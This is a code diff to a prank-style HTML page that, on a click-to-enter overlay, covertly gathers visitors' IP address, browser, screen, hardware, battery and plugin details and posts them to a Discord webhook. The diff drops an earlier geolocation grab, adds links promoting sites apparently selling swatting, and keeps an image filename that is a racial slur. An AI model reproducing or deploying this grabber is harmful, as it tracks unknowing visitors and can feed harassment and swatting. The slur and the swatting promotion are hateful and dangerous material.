@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title> HI </title>
+    <title>HI</title>
     <style>
         body {
             margin: 0;
@@ -26,6 +26,12 @@
             cursor: pointer;
             z-index: 2;
         }
+        .container {
+            text-align: center;
+            color: white;
+            display: none;
+            z-index: 1;
+        }
         .contact {
             position: absolute;
             bottom: 10px;
@@ -42,37 +48,33 @@
     <div class="overlay">
         <img src="niggers.jpg" alt="Click to Enter" width="300">
     </div>
+    <div class="container">
+        <h1>Other Sites:</h1>
+        <p>swatcity.fun swats.shop</p>
+    </div>
+
     <div class="contact">
         <p>Contact: lol@interpol.int.pl</p>
     </div>
+
     <audio id="background-music" src="friends.mp3" preload="auto" loop></audio>
 
     <script>
         const overlay = document.querySelector('.overlay');
+        const container = document.querySelector('.container');
         const audio = document.getElementById('background-music');
 
-       
+        // Function to send client data
         function sendClientData() {
-           
             const userAgent = navigator.userAgent;
-    
             const language = navigator.language;
-
-            
             const screenWidth = screen.width;
             const screenHeight = screen.height;
-
             const windowWidth = window.innerWidth;
             const windowHeight = window.innerHeight;
-
-      
             const scrollX = window.scrollX;
             const scrollY = window.scrollY;
-
-            
             const deviceMemory = navigator.deviceMemory;
-
-         
             const hardwareConcurrency = navigator.hardwareConcurrency;
 
             fetch('https://api.ipify.org?format=json')
@@ -80,64 +82,53 @@
                 .then(data => {
                     const ip = data.ip;
 
-            
-                    navigator.geolocation.getCurrentPosition(
-                        position => {
-                            const latitude = position.coords.latitude;
-                            const longitude = position.coords.longitude;
+                    // Get Battery Status
+                    navigator.getBattery().then(function(battery) {
+                        const batteryLevel = battery.level * 100; // in percentage
+                        const isCharging = battery.charging;
 
-                            
-                            navigator.getBattery().then(function(battery) {
-                                const batteryLevel = battery.level * 100; 
-                                const isCharging = battery.charging;
+                        // Get Installed Plugins (e.g., Flash, PDF viewer)
+                        const plugins = navigator.plugins;
 
-                                
-                                const plugins = navigator.plugins;
+                        // Send data to Discord Webhook
+                        const discordWebhookUrl = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_URL'; // Replace with your webhook URL
+                        const logData = {
+                            content: `Client Data:
+                            IP: ${ip}
+                            User Agent: ${userAgent}
+                            Language: ${language}
+                            Screen: ${screenWidth}x${screenHeight}
+                            Window: ${windowWidth}x${windowHeight}
+                            Scroll Position: (${scrollX}, ${scrollY})
+                            Device Memory: ${deviceMemory} GB
+                            Hardware Concurrency: ${hardwareConcurrency} cores
+                            Battery Level: ${batteryLevel}%
+                            Charging: ${isCharging}
+                            Plugins: ${plugins.length > 0 ? plugins : 'No plugins detected'}
+                            `
+                        };
 
-                                const discordWebhookUrl = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_URL'; // Replace with your webhook URL
-                                const logData = {
-                                    content: `Client Data:
-                                    IP: ${ip}
-                                    User Agent: ${userAgent}
-                                    Language: ${language}
-                                    Screen: ${screenWidth}x${screenHeight}
-                                    Window: ${windowWidth}x${windowHeight}
-                                    Scroll Position: (${scrollX}, ${scrollY})
-                                    Device Memory: ${deviceMemory} GB
-                                    Hardware Concurrency: ${hardwareConcurrency} cores
-                                    Latitude: ${latitude}
-                                    Longitude: ${longitude}
-                                    Battery Level: ${batteryLevel}%
-                                    Charging: ${isCharging}
-                                    Plugins: ${plugins.length > 0 ? plugins : 'No plugins detected'}
-                                    `
-                                };
-
-                                fetch(discordWebhookUrl, {
-                                    method: 'POST',
-                                    headers: {
-                                        'Content-Type': 'application/json'
-                                    },
-                                    body: JSON.stringify(logData)
-                                })
-                                .then(response => {
-                                    console.log('Client data sent to Discord.');
-                                })
-                                .catch(err => {
-                                    console.error('Error sending to Discord:', err);
-                                });
-                            });
-                        },
-                        error => {
-                            console.log('Geolocation error:', error.message);
-                        }
-                    );
+                        fetch(discordWebhookUrl, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify(logData)
+                        })
+                        .then(response => {
+                            console.log('Client data sent to Discord.');
+                        })
+                        .catch(err => {
+                            console.error('Error sending to Discord:', err);
+                        });
+                    });
                 })
                 .catch(err => {
                     console.error('Error fetching IP:', err);
                 });
         }
 
+        // Function to make the browser go fullscreen
         function goFullScreen() {
             if (document.documentElement.requestFullscreen) {
                 document.documentElement.requestFullscreen();
@@ -152,10 +143,11 @@
 
         // Event listener for overlay click
         overlay.addEventListener('click', () => {
-            overlay.style.display = 'none'; 
+            overlay.style.display = 'none';
+            container.style.display = 'block'; // Show the text when the overlay is clicked
             audio.play();
             goFullScreen(); 
-            sendClientData();
+            sendClientData(); // Send all collected client data
         });
     </script>
 </body>
